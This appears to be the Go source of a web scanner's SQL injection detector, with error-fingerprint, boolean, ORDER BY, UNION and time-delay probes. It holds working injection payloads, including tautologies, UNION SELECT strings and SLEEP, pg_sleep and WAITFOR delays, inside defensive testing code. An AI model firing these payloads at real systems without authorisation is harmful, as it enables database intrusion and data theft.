// SQL injection detection.
//
// Three techniques, in the order that costs the target the least: an error
// fingerprint, a boolean differential, and a column count. The first that
// answers the question ends the probe for that surface, because a parameter that
// leaks a database error in a quoted string has already said what it is and
// further probes only generate more traffic to prove a second time.
//
// # Why every technique checks the baseline
//
// A database error fingerprint is a *specific* string, so it is cheap to be
// sure about — but only if the page did not already contain it. An application
// with a "Database error" help page, a status dashboard that renders the last
// failed query, or a README that documents the error text would otherwise
// report SQL injection on every parameter it has. `Fresh` is what makes the
// fingerprint mean "the injection caused this".
package active

import (
	"context"
	"fmt"
	"html"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// dbFingerprints maps an error signature to the engine that produces it.
//
// The signatures are anchored on the parts an engine does not vary: the fixed
// phrase and the position marker. A looser pattern — "error" near the word
// "SQL", say — matches application error pages, log viewers and issue trackers,
// and turns a scanner into a generator of noise.
var dbFingerprints = []struct {
	db      string
	finger  string
	minimum int
}{
	{"MySQL", "you have an error in your sql syntax", 0},
	{"MySQL", "warning: mysql", 0},
	{"MSSQL", "unclosed quotation mark after the character", 0},
	{"MSSQL", "sql server native client", 0},
	{"PostgreSQL", "unterminated quoted string at or near", 0},
	{"PostgreSQL", "pg_query()", 0},
	{"PostgreSQL", "pg_exec()", 0},
	{"Oracle", "ora-", 0},
	{"SQLite", "sqlite_query()", 0},
	{"SQLite", "sqlite3::query", 0},
	{"SQLite", "sqlstate hy000", 0},
}

// breakoutProbes break out of a quoted context so a database has to say
// something. They are ordered cheapest first: a single quote is one byte and
// frequently enough to produce a diagnostic on its own.
//
// Past the first five the list comes from two directions. Some are literal
// breakouts the obvious ones miss — a backslash that escapes the closing quote,
// MySQL's versioned comment `/*!1111'*/`, which is a comment to one parser and
// executable to another. Some are concatenations, which matter on engines where
// the quote never breaks the literal at all: `1'||'asd'||'` is a complete
// injection on an Oracle-class parser and is an ordinary string everywhere else,
// so it costs one request and costs nothing when it is not the right engine.
//
// The terminator half matters for a different reason. A breakout that leaves the
// application's own tail dangling — `'` on its own, `admin'--` without the
// `--`, `”` — produces a *syntax* error rather than a clean refusal on some
// engines and a diagnostic on others, so the same page answers differently
// depending on what closes the statement. Each terminator is therefore its own
// probe: `#` is a comment to MySQL and not to PostgreSQL, `-- -` is the reverse,
// and `/*` needs a closing `*/` the application never sends.
var breakoutProbes = []string{
	`'`,
	`"`,
	`')`,
	`'))`,
	`\'`,
	"1`",
	`1\`,
	"1/*'*/",
	"1/*!1111'*/",
	"1'||'asd'||'",
	`'or''='`,
	`[1]`,
	// Bare quote pairs and the delimiters a form decoder strips on the way in.
	`''`,
	"`",
	"``",
	`,`,
	`""`,
	`/`,
	`//`,
	`\\`,
	`;`,
	`' or "`,
	`' OR '1`,
	`' OR 1 -- -`,
	`" OR "" = "`,
	`" OR 1 = 1 -- -`,
	`' OR '' = '`,
	`'='`,
	`'LIKE'`,
	`'=0--+`,
	` OR 1=1`,
	`' OR 'x'='x`,
	`' AND id IS NULL; --`,
	// Terminators, each paired with the quote that needs one.
	`admin'--`,
	`admin'#`,
	`admin'/*`,
	`' or ''-`,
	`" or ""-`,
	`' or '' `,
	`" or "" `,
	`-- or # `,
	// A second quote opens a fresh literal on engines that treat `''` as one.
	"'''''''''''''UNION SELECT '2",
	`%00`,
	`/*…*/`,
	// ORDER BY inside a broken literal: the ladder is walked on its own below,
	// and these are its quoted-context spellings.
	`1' ORDER BY 1--+`,
	`1' ORDER BY 2--+`,
	`1' ORDER BY 1,2--+`,
	`1' ORDER BY 1,2,3--+`,
	`1' GROUP BY 1,2,3--+`,
	`' GROUP BY columnnames having 1=1 --`,
	`HAVING 1=1`,
	`WHERE 1=1`,
	`RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='`,
	`RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='`,
	`AS INJECTX WHERE 1=1 AND 1=1`,
	`AS INJECTX WHERE 1=1 AND 1=0`,
	// Variable markers, which reach engines that fold them before parsing.
	`@`,
	`@@version`,
}

// arrayParamSuffixes are the parameter names a backend reads instead of the one
// the page published.
//
// This is a different axis from a value, and no value reaches it: nothing in the
// value makes an application look at a field that is not there. A page whose form
// posts `q` while the query reads `q[]` concatenates nothing into the database —
// it drops the field entirely — so the whole value table above returns nothing on
// it, and the parameter has to be asked for by name.
var arrayParamSuffixes = []string{"[]", "[0]"}

// booleanPairs are tautology and contradiction pairs. The false arm has to
// reference a column that does not exist, so a difference is caused by the
// condition rather than by a syntax error either arm shares.
var booleanPairs = []struct {
	trueArm  string
	falseArm string
}{
	{`' AND '1'='1`, `' AND '1'='2`},
	{` AND 1=1`, ` AND 1=2`},
	{` AND 2>1`, ` AND 2>1 AND 2<1`},
	// The same three conditions without the leading space, because a filter that
	// looks for a space between the quote and `AND` rejects the first three and
	// accepts these. A pair that differs only in spacing is a real parsing
	// divergence, not a longer version of the same idea.
	{`1' or '1'='1`, `1' or '1'='2`},
	{`1 or 1=1`, `1 or 1=2`},
	// A comment after the condition, in two of the three terminators a backend
	// honours. The pair is only meaningful when *both* arms return a page: this
	// detector treats "the false arm is an error" as a refusal rather than as a
	// condition deciding the outcome, so a pair whose false arm becomes a syntax
	// error measures the wrong thing and is deliberately not here.
	{`1 OR 1=1#`, `1 OR 1=2#`},
	{`/**/OR/**/1=1-- -`, `/**/OR/**/2=2-- -`},
	// Identical comparisons against a column name rather than literals. `x=x`
	// and `x=y` differ only in the right-hand side, so a page that answers
	// differently was reading a column and evaluating it — a fact a pair of
	// literals cannot show, because literals are the same on both arms.
	{` OR x=x`, ` OR x=y`},
	{` AND x=x`, ` AND x=y`},
	{`' OR 'x'='x`, `' OR 'x'='y`},
	// The clause an application puts the value into decides which keyword is the
	// last thing in the statement, so `WHERE`, `HAVING` and the `AS`-aliased
	// form each parse a filter the other two do not.
	{` HAVING 1=1`, ` HAVING 1=0`},
	{` WHERE 1=1`, ` WHERE 1=0`},
	{`AS INJECTX WHERE 1=1 AND 1=1`, `AS INJECTX WHERE 1=1 AND 1=0`},
	// A closing parenthesis the application never sent. The pair is unbalanced
	// on purpose: on a page that builds `WHERE (id = <value>)` the false arm
	// fails to parse for every parameter, and a detector that insists on both
	// arms parsing reports nothing at all.
	{` AND 1083=1083 AND ('1427=1427`, ` AND 7506=9091 AND ('5913=5913`},
}

// boolTolerance is how much of the document the true arm is allowed to differ
// by. A boolean condition that holds must render the page it rendered before;
// anything above a rounding difference is a different page, and a detector that
// accepts a different page accepts every request.
const boolTolerance = 0.005

// differentialFloor is the smallest departure from the baseline that counts as a
// real change at all.
const differentialFloor = 0.005

// differentialRatio is how much larger the false arm's departure has to be than
// the true arm's.
//
// The ratio carries the decision, not the floor, and the reason is that a real
// page is mostly shared boilerplate. Replacing one result block inside a
// document that ends in a repeated footer changes a small *fraction* of it — the
// measure is relative to the document on purpose — so an absolute threshold set
// high enough to be confident about a short response silently rejects every
// finding on a long one. Comparing the two arms against each other does not
// have that failure: a page that varies on its own makes both arms vary, and
// this ratio is what refuses it.
const differentialRatio = 8

// orderByCounts is the ordinal ladder walked to find where the statement stops
// accepting a sort column.
//
// A statement with N columns accepts `ORDER BY 1..N` and refuses N+1, so the
// first ordinal that draws a *fresh* database diagnostic marks the boundary. It
// is a different question from the UNION ladder and it is cheaper: one ordinal
// per request, and it needs no working UNION, so it names the column count on a
// target whose UNION is filtered.
var orderByCounts = []int{
	1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
}

// unionColumnCounts are the column counts tried when the parameter looks
// numeric.
//
// The range is the whole ladder rather than a narrow band, because a page that
// returns 31 columns is a real table and a detector that stops at eight reports
// "no UNION" on it. Each count is one request and the walk stops at the first
// that answers, so the cost is paid only on surfaces where nothing cheaper
// worked.
var unionColumnCounts = []int{
	1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
}

// SQLi is the SQL injection detector.
type SQLi struct {
	// BlindDelay is how long the time-based technique asks the target's database
	// to wait. Zero means DefaultBlindDelay.
	//
	// A field rather than a constant, for the reason `CMDi.BlindDelay` is one:
	// this technique makes somebody else's application slow, so the cost belongs
	// where the operator can see it and change it, not inside a loop they never
	// asked for. The field costs nothing when it is unset.
	BlindDelay time.Duration
}

// Name implements Module.
func (SQLi) Name() string { return "sqli" }

// Level implements Module.
func (SQLi) Level() Level { return LevelParam }

// Scan probes one surface.
//
// Columns is reported alongside a UNION finding when one succeeds, because a PoC
// that hard-codes a column count is a PoC that fails against the next table.
// The exploit stage reads it instead of guessing.
//
// The time-based stage runs last and only when the three cheap ones all failed.
// It is the most expensive technique here — each payload holds a connection open
// for the delay the operator asked for — so it is never paid for a surface that
// already answered.
func (m SQLi) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	var out []Finding
	if finding := errorProbe(ctx, t, p, baseline); finding != nil {
		return []Finding{*finding}
	}
	if finding := booleanProbe(ctx, t, p, baseline); finding != nil {
		return []Finding{*finding}
	}
	if finding := orderByProbe(ctx, t, p, baseline); finding != nil {
		return []Finding{*finding}
	}
	if finding := unionProbe(ctx, t, p, baseline); finding != nil {
		return []Finding{*finding}
	}
	delay := m.BlindDelay
	if delay <= 0 {
		delay = DefaultBlindDelay
	}
	if finding := timeProbe(ctx, t, p, baseline, delay); finding != nil {
		return []Finding{*finding}
	}
	return out
}

// errorProbe looks for a database error fingerprint that the baseline did not
// contain.
func errorProbe(ctx context.Context, t *Transport, p Point, baseline *Response) *Finding {
	for _, probe := range breakoutProbes {
		if ctx.Err() != nil {
			return nil
		}
		if finding := probeValue(ctx, t, p, baseline, p.Param, probe); finding != nil {
			return finding
		}
	}
	// The same question asked of the parameter *names* a backend may read instead
	// of the one the page published. This is a different axis from a value: no
	// value makes an application look at a field that is not there, so the bracket
	// form has to be asked for by name.
	//
	// Two probes, not the whole table. The name is the variable here, so the value
	// shapes add nothing: a backend that concatenates `q[]` into a query breaks on
	// the first quote it is handed, and every further shape of the same value is
	// another request to learn the same thing.
	for _, suffix := range arrayParamSuffixes {
		if ctx.Err() != nil {
			return nil
		}
		if finding := probeValue(ctx, t, p, baseline, p.Param+suffix, `'`); finding != nil {
			return finding
		}
	}
	return nil
}

// probeValue sends one value into one parameter name and reports the database
// diagnostic it produced, if any.
//
// The payload recorded on the finding is the whole `name=value` that was sent, not
// the value alone: a report has to say which field the diagnostic came from, and
// `q[]='` and `q='` are different exchanges against the same endpoint.
func probeValue(ctx context.Context, t *Transport, p Point, baseline *Response, param, probe string) *Finding {
	resp, err := t.Fire(ctx, p, param, probe, false, nil)
	if err != nil {
		return nil
	}
	for _, signature := range dbFingerprints {
		finger := signature.finger
		if !FreshFold(baseline, resp, finger) {
			continue
		}
		// A fingerprint found in a *smaller* response than the baseline is
		// the page having been replaced by an error page, not by an
		// injected error. It is still a genuine diagnostic, and the
		// excerpt shows which of the two it is.
		return build(p, SeverityCritical, TierVerified, param+"="+probe,
			fmt.Sprintf("%s diagnostic produced by the injected quote: %q", signature.db, finger),
			fmt.Sprintf("Server-Side Template/Query Injection (Error-Based) - %s", signature.db),
			"The parameter value reaches a database parser. A quote injected through it produced a "+signature.db+
				" diagnostic in the response, which means the value is concatenated into a statement rather than bound.",
			"Use parameterised queries or prepared statements. Never build a statement by concatenation. "+
				"Return generic errors to clients and log the detail server-side.")
	}
	return nil
}

// booleanProbe compares a tautology against a contradiction.
//
// The rule it enforces is that a true condition must look like the baseline and
// a false one must not. Requiring both directions is what makes it a
// differential rather than a search for anything different: a page that simply
// errors on both arms produces two matching responses, which the test rejects,
// and only a real condition produces the split.
func booleanProbe(ctx context.Context, t *Transport, p Point, baseline *Response) *Finding {
	for _, pair := range booleanPairs {
		if ctx.Err() != nil {
			return nil
		}
		trueResp, errTrue := t.Fire(ctx, p, p.Param, pair.trueArm, false, nil)
		if errTrue != nil {
			continue
		}
		falseResp, errFalse := t.Fire(ctx, p, p.Param, pair.falseArm, false, nil)
		if errFalse != nil {
			continue
		}
		baseVsTrue := Divergence(baselineBody(baseline), trueResp.Body)
		baseVsFalse := Divergence(baselineBody(baseline), falseResp.Body)
		armsVsEachOther := Divergence(trueResp.Body, falseResp.Body)
		// The true arm reproduces the page, the false arm measurably departs
		// from it, and the two arms are measurably different from each other.
		// All three, or it is not a condition being evaluated: without the
		// first, a page that changes on every request qualifies; without the
		// second, a page that errors identically on both arms qualifies.
		if baseVsTrue <= boolTolerance &&
			baseVsFalse >= differentialFloor && baseVsFalse >= baseVsTrue*differentialRatio &&
			armsVsEachOther >= differentialFloor && armsVsEachOther >= baseVsTrue*differentialRatio {
			return build(p, SeverityCritical, TierPotential, pair.trueArm,
				fmt.Sprintf("true arm reproduces the baseline (divergence %.3f), false arm departs from it "+
					"(%.3f), and the two arms differ from each other (%.3f)",
					baseVsTrue, baseVsFalse, armsVsEachOther),
				"SQL Injection (Boolean-Based Blind)",
				"The response differs for a tautology and for a contradiction, so the condition is evaluated "+
					"server-side. Data can be extracted one bit at a time even though no output is reflected.",
				"Use parameterised queries. Keep responses identical for a true and a false condition.")
		}
	}
	return nil
}

// unionProbe walks column counts against a numeric parameter.
//
// The upstream test accepted a 200 status as evidence of a UNION, which means
// any page that answered 200 with a slightly different body would be reported.
// Here a UNION is only accepted when the response grew *and* the added text is
// the number of NULL columns requested — that is, when the database is visibly
// returning more fields than the query asked for.
func unionProbe(ctx context.Context, t *Transport, p Point, baseline *Response) *Finding {
	if !numericBaseline(p) {
		return nil
	}
	for _, columns := range unionColumnCounts {
		if ctx.Err() != nil {
			return nil
		}
		nulls := strings.TrimSuffix(strings.Repeat("NULL,", columns), ",")
		payload := "-1 UNION SELECT " + nulls + "-- -"
		resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err != nil {
			continue
		}
		// A wrong column count produces a diagnostic, not a row. Skipping
		// those is not a filter, it is recognising the difference between "the
		// database complained" and "the database answered".
		if hasAnyFingerprint(resp.Body) {
			continue
		}
		if baseline == nil {
			return nil
		}
		// The request asked for a row that does not exist, so the honest
		// baseline is a page that lost a record. A response longer than the
		// baseline is the shape a working UNION produces.
		if len(resp.Body) <= len(baseline.Body) {
			continue
		}
		if Divergence(baseline.Body, resp.Body) < differentialFloor {
			continue
		}
		// The request asked for a row of NULL columns, so the honest shape of a
		// working UNION is that the response *gained blankness* — extra empty
		// cells and nothing else. A response that gained text gained it from
		// somewhere else: a rotating banner, an ad slot, a timestamp, a locale
		// switch. Requiring the added region to be blank is what separates "the
		// database returned more columns than the page asked for" from "the page
		// was different this time", and it is why a plain 200 is not accepted
		// here however much it differs.
		if !addedIsBlank(baseline.Body, resp.Body) {
			continue
		}
		return build(p, SeverityCritical, TierPotential, payload,
			fmt.Sprintf("UNION with %d columns returned a longer response than the baseline (%d vs %d bytes) "+
				"with no database diagnostic, so the query structure is attacker-controlled", columns, len(resp.Body), len(baseline.Body)),
			fmt.Sprintf("SQL Injection (UNION SELECT) - %d columns", columns),
			"A UNION SELECT with a matching column count rendered, which means the attacker controls the query "+
				"structure and can read any table the database account can reach.",
			"Use parameterised queries. Validate numeric input. Run the database account with least privilege.")
	}
	return nil
}

// orderByProbe walks the ordinal ladder and names the column count from the
// first ordinal that draws a diagnostic.
//
// This answers the same question as the UNION walk — how many columns does the
// statement select — by a different question, and that difference is the point.
// A UNION needs the count to produce anything at all, so on a page whose UNION
// keyword is filtered it produces nothing; `ORDER BY 31` needs only that the
// number reach the parser, and the refusal *is* the answer. It is also why the
// boundary is read rather than the first refusal: a statement with 3 columns
// refuses 4, so the count is the refused ordinal minus one, and a refusal at 1
// means the count is not in this ladder at all, which is reported as nothing.
func orderByProbe(ctx context.Context, t *Transport, p Point, baseline *Response) *Finding {
	if baseline == nil || !numericBaseline(p) {
		// The ladder has to be numeric. `ORDER BY` after a quote only reaches
		// the parser on an application that concatenates, and the concatenation
		// itself is already proven by the error technique on those surfaces.
		return nil
	}
	firstRefusal, refusalPayload, refusedEngine := 0, "", ""
	for _, ordinal := range orderByCounts {
		if ctx.Err() != nil {
			return nil
		}
		payload := "1 ORDER BY " + strconv.Itoa(ordinal) + "-- -"
		resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err != nil {
			// A refused request says nothing about the ordinal; skipping it
			// keeps a slow page from inventing a boundary in the middle of the
			// ladder.
			continue
		}
		engine := freshDiagnostic(baseline, resp)
		if engine == "" {
			continue
		}
		firstRefusal, refusalPayload, refusedEngine = ordinal, payload, engine
		break
	}
	if firstRefusal <= 1 || refusalPayload == "" {
		// No refusal, or a refusal at the very first ordinal: neither names a
		// column count, and guessing one would put a wrong number into every
		// PoC that quotes it.
		return nil
	}
	columns := firstRefusal - 1
	return build(p, SeverityCritical, TierVerified, refusalPayload,
		fmt.Sprintf("ORDER BY %d drew a fresh %s diagnostic while every ordinal up to %d did not, "+
			"so the statement selects %d columns", firstRefusal, refusedEngine, columns, columns),
		fmt.Sprintf("SQL Injection (ORDER BY Column Count) - %d columns", columns),
		"A sort ordinal past the last column drew a database diagnostic, which means the value reaches the "+
			"statement and the attacker controls its structure. The number of columns is established by the "+
			"boundary rather than assumed, so a PoC built from it is repeatable.",
		"Use parameterised queries. Validate numeric input. Run the database account with least privilege.")
}

// freshDiagnostic returns the engine whose diagnostic the injected request
// produced and the baseline did not carry, or "" when it produced none.
func freshDiagnostic(baseline, resp *Response) string {
	lower := strings.ToLower(resp.Body)
	for _, signature := range dbFingerprints {
		if FreshFold(baseline, resp, signature.finger) {
			return signature.db
		}
		if strings.Contains(lower, signature.finger) {
			// The signature is in the baseline as well, so `FreshFold` refuses
			// it. That refusal is about this page, not about this request, and
			// continuing here would let a page that always prints an error
			// decide the boundary.
			return ""
		}
	}
	return ""
}

// sqlDelaySyntax is one engine's way of making the database wait, and whether
// it can express an arbitrary duration.
type sqlDelaySyntax struct {
	name string
	// build returns the payload for a delay, and ok=false when this engine has
	// no spelling of that duration — a whole-second clock cannot be asked for
	// half a second, and sending `0:0:0` asks for no delay at all, which would
	// read as a fast response and prove nothing.
	build func(d time.Duration) (payload string, ok bool)
	// gain multiplies the requested delay before it is compared. It is 1 for a
	// function that sleeps for exactly what it is told, and larger for a
	// function whose duration is an estimate: BENCHMARK runs an iteration count,
	// so the same count costs different amounts of time on different hardware.
	gain float64
}

// sqlDelaySyntaxes are the ways of delaying a database, ordered by how likely
// the engine is to answer them at all.
//
// Nothing here writes, drops, alters or executes. `BENCHMARK` burns CPU and
// `RANDOMBLOB` allocates memory on the target — both are read-only but neither
// is free, and both are priced by the delay the operator set, which is why that
// delay is a field on the detector rather than a constant in the loop.
var sqlDelaySyntaxes = []sqlDelaySyntax{
	{
		name: "MySQL SLEEP",
		build: func(d time.Duration) (string, bool) {
			return " AND SLEEP(" + delaySeconds(d) + ")", true
		},
		gain: 1,
	},
	{
		name: "MySQL SLEEP, quoted",
		build: func(d time.Duration) (string, bool) {
			return "' AND SLEEP(" + delaySeconds(d) + ")-- -", true
		},
		gain: 1,
	},
	{
		name: "MySQL BENCHMARK",
		build: func(d time.Duration) (string, bool) {
			// Iterations, not seconds. Ten million MD5 hashes cost about a
			// second on ordinary hardware, and the `gain` above pays for that
			// guess: three times the requested delay has to arrive before the
			// finding is credited, so a faster machine cannot produce a false
			// positive, only a miss.
			return " AND BENCHMARK(" + benchmarkIterations(d) + ",MD5(1))", true
		},
		gain: 3,
	},
	{
		name: "PostgreSQL pg_sleep",
		build: func(d time.Duration) (string, bool) {
			return " AND pg_sleep(" + delaySeconds(d) + ")", true
		},
		gain: 1,
	},
	{
		name: "PostgreSQL pg_sleep, quoted",
		build: func(d time.Duration) (string, bool) {
			return "'; SELECT pg_sleep(" + delaySeconds(d) + ")-- -", true
		},
		gain: 1,
	},
	{
		name: "MSSQL WAITFOR DELAY",
		build: func(d time.Duration) (string, bool) {
			// Zero is not refused: `0:0:0` is a valid clock literal that returns
			// at once, and it is the control arm this detector runs. Only a real
			// fraction of a second has no spelling here.
			if d > 0 && d < time.Second {
				return "", false
			}
			return "'; WAITFOR DELAY '0:0:" + strconv.Itoa(int(d/time.Second)) + "'-- -", true
		},
		gain: 1,
	},
	{
		name: "Oracle DBMS_LOCK.SLEEP",
		build: func(d time.Duration) (string, bool) {
			if d > 0 && d < time.Second {
				return "", false
			}
			return "'; BEGIN DBMS_LOCK.SLEEP(" + strconv.Itoa(int(d/time.Second)) + "); END;-- -", true
		},
		gain: 1,
	},
	{
		name: "SQLite RANDOMBLOB",
		build: func(d time.Duration) (string, bool) {
			bytes := int(d / time.Millisecond * sqliteBlobBytesPerMillisecond)
			// `randomblob(0)` is valid and allocates nothing, so the control arm
			// exists here too. What is refused is a delay big enough to stop
			// being a delay: asking SQLite for more than half a gigabyte of
			// random bytes is not a delay, it is an out-of-memory condition on
			// somebody else's server, and the reason is in the code rather than
			// discovered at run time.
			if d < 0 || (bytes > 0 && bytes > maxSQLiteBlobBytes) {
				return "", false
			}
			return " AND 1=randomblob(" + strconv.Itoa(bytes) + ")", true
		},
		gain: 1,
	},
}

const (
	// sqliteBlobBytesPerMillisecond prices SQLite's only read-only delay. There
	// is no sleep function, so a blob is allocated until the allocation itself
	// costs the time; 250 kB per millisecond is a measured ballpark on ordinary
	// hardware, and no gain corrects it because the control arm below is what
	// actually rules out a fast machine.
	sqliteBlobBytesPerMillisecond = 250_000
	// maxSQLiteBlobBytes is where this detector stops pricing the target's
	// memory. It is a ceiling on the *technique*, not on the operator's delay:
	// the delay is honoured by every engine that can express it, and the finding
	// names the spelling that was used.
	maxSQLiteBlobBytes = 500_000_000
)

// delaySeconds renders a duration the way a sleep function takes it: a number
// with no trailing zeros, so 2 s is `2` and 400 ms is `0.4`.
func delaySeconds(d time.Duration) string {
	seconds := float64(d) / float64(time.Second)
	text := strconv.FormatFloat(seconds, 'f', 1, 64)
	return strings.TrimSuffix(text, ".0")
}

// benchmarkIterations converts a delay into an iteration count for BENCHMARK.
func benchmarkIterations(d time.Duration) string {
	const perSecond = 10_000_000.0
	iterations := int64(float64(d) / float64(time.Second) * perSecond)
	if iterations < 1_000_000 {
		iterations = 1_000_000
	}
	return strconv.FormatInt(iterations, 10)
}

// delayMargin is how much less than the requested delay a response may come back
// and still count.
//
// `blindNoiseMargin` is the ceiling; half the requested delay is the floor under
// it, because a margin larger than half the delay can never be cleared by any
// response at all — a 400 ms probe asks for 400 ms and cannot reach 400−750 ms.
// Capping the margin at half keeps the rule the same for every duration the
// operator asks for instead of silently doing nothing below a second and a half.
func delayMargin(delay time.Duration) time.Duration {
	if half := delay / 2; blindNoiseMargin > half {
		return half
	}
	return blindNoiseMargin
}

// timeProbe measures whether a database waited when it was asked to.
//
// The measurement is a *scaling* one, and that is not decoration. A live `.ru`
// target answered `pg_sleep(1)` in 8.2s against a baseline of 868ms, so the
// increment was 7.3s for a one-second request and the older rule — "slower than
// the baseline by roughly what I asked for" — credited it. Nothing was injected.
// The page was slow, once, and one sample cannot tell that from a delay.
//
// So the same syntax is fired twice: once for the delay the operator asked for
// and once for twice it. A database that waited out the request adds roughly
// twice as much to the long probe as to the short one, and the difference
// between the two increments is the delay itself. A page with a fixed cost adds
// the same amount to both, the difference is near zero, and nothing is credited.
// That is the one thing the two numbers together know that either number alone
// does not.
//
// Twice rather than half because a half has to be spellable. `SLEEP(0.4)` is,
// `WAITFOR DELAY '0:0:0'` is not, and a rule that quietly stopped measuring on
// the two engines that count whole seconds would be least reliable exactly where
// a target is most likely to be. Two seconds is always spellable on every engine
// in the table.
//
// The increment over the baseline is kept as well, because it is what isolates
// the injection from an application that is slow on its own — and the control
// arm, the identical spelling with no delay in it, still has to come back
// promptly, or the slowness came from the payload being present rather than from
// the function it calls.
func timeProbe(ctx context.Context, t *Transport, p Point, baseline *Response, delay time.Duration) *Finding {
	if baseline == nil || delay <= 0 {
		// With no measured baseline there is nothing to compare against, and a
		// fixed threshold is the guess this function exists to avoid.
		return nil
	}
	required := delay - delayMargin(delay)
	// The long arm of the pair. `delay*2` is what makes the measurement
	// possible on engines that count whole seconds; a doubling of a delay the
	// operator already chose stays a delay they chose.
	longArm := delay * 2
	canScale := false
	var longIncrement time.Duration
	for _, syntax := range sqlDelaySyntaxes {
		if ctx.Err() != nil {
			return nil
		}
		payload, ok := syntax.build(delay)
		if !ok {
			// This engine cannot be asked for this duration at all.
			continue
		}
		resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err != nil || hasAnyFingerprint(resp.Body) {
			continue
		}
		// The increment is what isolates the injection. A delay of N adds N to
		// whatever the request already cost, so an application that is slow on
		// its own shows an increment of approximately zero and is not credited.
		wanted := time.Duration(float64(delay)*syntax.gain) - delayMargin(delay)
		increment := resp.Duration - baseline.Duration
		if increment < wanted {
			continue
		}
		if !canScale {
			// The long arm is measured only for the syntax that got this far, so
			// a target that answers nothing to the short probe is never asked the
			// expensive question.
			longPayload, ok := syntax.build(longArm)
			if !ok {
				// This engine cannot be asked for the doubled delay. Refusing
				// here would blind the technique on an engine whose clock has no
				// half-seconds, so the syntax is skipped and the walk goes on.
				continue
			}
			longResp, err := t.Fire(ctx, p, p.Param, longPayload, false, nil)
			if err != nil || hasAnyFingerprint(longResp.Body) {
				continue
			}
			longIncrement = longResp.Duration - baseline.Duration
			// The decisive number. A database that waited out the request adds
			// about twice the delay to the long arm, so the difference between the
			// two increments is about the delay itself. A page whose cost is
			// fixed adds the same to both, the difference is near zero, and this
			// is where the finding that a live `.ru` target produced by accident
			// is refused.
			if longIncrement-increment < delay-delayMargin(delay) {
				continue
			}
			canScale = true
		}
		// The control arm: the same spelling with no delay in it. If that is
		// slow too, the slowness came from the payload being present, not from
		// the function it calls.
		controlPayload, ok := syntax.build(0)
		if !ok {
			// A spelling that cannot ask for zero has no control arm to run, so
			// it is not credited — the arm is the evidence, not a nicety.
			continue
		}
		control, err := t.Fire(ctx, p, p.Param, controlPayload, false, nil)
		if err != nil {
			continue
		}
		controlIncrement := control.Duration - baseline.Duration
		if controlIncrement >= required {
			continue
		}
		// The control arm's cost is reported as an increment, and an increment
		// can be negative when the control request happened to be faster than the
		// baseline. Printing that raw number reads as a measurement of nothing, so
		// it is stated as what it means: the control arm did not cost the delay.
		controlCost := "faster than the baseline"
		if controlIncrement >= 0 {
			controlCost = (controlIncrement).Round(time.Millisecond).String()
		}
		// The evidence carries the scaling pair when there was one. A reader
		// cannot check "faster than the baseline" against anything, but two
		// increments at two requested delays is a pair they can verify, and it is
		// the pair that decides the finding now.
		scaling := ""
		if canScale {
			scaling = fmt.Sprintf("; the same spelling for %s added %s, so the cost grows with the delay "+
				"asked for rather than with the payload",
				longArm, longIncrement.Round(time.Millisecond))
		}
		return build(p, SeverityCritical, TierPotential, payload,
			fmt.Sprintf("with %s injected the response took %s against a baseline of %s, an increment of %s "+
				"where %s was requested; the same spelling without a delay came back %s%s",
				syntax.name, resp.Duration.Round(time.Millisecond), baseline.Duration.Round(time.Millisecond),
				increment.Round(time.Millisecond), delay, controlCost, scaling),
			"SQL Injection (Time-Based Blind, "+syntax.name+")",
			"The database waited roughly as long as it was asked to wait and returned promptly for the same "+
				"payload without the wait. No data came back, so what is demonstrated is that a database "+
				"function the attacker chose was executed, not that a value was read.",
			"Use parameterised queries or prepared statements. Never build a statement by concatenation.")
	}
	return nil
}

// build assembles a finding through the tier-gated constructor, so no detector
// can assign a severity the evidence does not support.
func build(p Point, claimed Severity, tier Tier, payload, evidence, title, description, remediation string) *Finding {
	finding, _ := NewFinding(Spec{
		Module: "sqli", Title: title, Claimed: claimed, Tier: tier, Point: p,
		Payload: payload, Evidence: evidence, Description: description, Remediation: remediation,
	})
	return &finding
}

// hasAnyFingerprint reports whether the body carries a database diagnostic of
// any engine.
func hasAnyFingerprint(body string) bool {
	lower := strings.ToLower(body)
	for _, signature := range dbFingerprints {
		if strings.Contains(lower, signature.finger) {
			return true
		}
	}
	return false
}

// addedIsBlank reports whether the injected response carries no readable text
// beyond what it shares with the baseline.
//
// This is the test a UNION of NULL columns has to pass, and the one an unrelated
// page difference fails. The subtlety is that a real response does not gain
// whitespace: it gains markup. A table row with an extra empty cell arrives as
// `<td></td>`, and requiring the added bytes to be blank would reject exactly
// the response that proves the injection. What distinguishes it from a rotating
// banner or a counter is that a NULL column adds an *empty* cell — markup, yes,
// and no text.
//
// So the region is reduced to its readable text and *that* has to be empty. A
// banner contributes a sentence, a counter contributes digits, an ad slot
// contributes copy; a NULL contributes nothing at all.
func addedIsBlank(baseline, injected string) bool {
	shared := 0
	for shared < len(baseline) && shared < len(injected) && baseline[shared] == injected[shared] {
		shared++
	}
	// The comparison above is byte-wise, so it stops wherever the two pages first
	// differ — and two pages very often differ *inside a tag*. A table that gained
	// an empty row has `</table>` in the baseline and `<tr>` in the injected page
	// at the same offset, both of which begin with `<`, so the shared prefix eats
	// the bracket and the "added" region starts with `tr>`. That is not a tag, so
	// nothing is stripped, `tr>` is the readable text, and the rule rejects a
	// genuine union response.
	//
	// The fix is to give the tag back: rewind to the `<` that opened it, so the
	// region is a whole tag again and strips to nothing. A real banner or a
	// timestamp still leaves text behind, which is what the rule is for.
	if open := strings.LastIndex(injected[:shared], "<"); open > 0 {
		shared = open
	}
	return strings.TrimSpace(readableText(injected[shared:])) == ""
}

// readableText reduces a region of HTML to the text a reader would see.
//
// Tags and the entities that stand for punctuation are removed because they are
// structure, not content. A cell holding "&nbsp;" is visually empty and is
// treated as empty here, which is the same judgement a person triaging the row
// makes.
var htmlTagPattern = regexp.MustCompile(`(?s)<[^>]*>`)

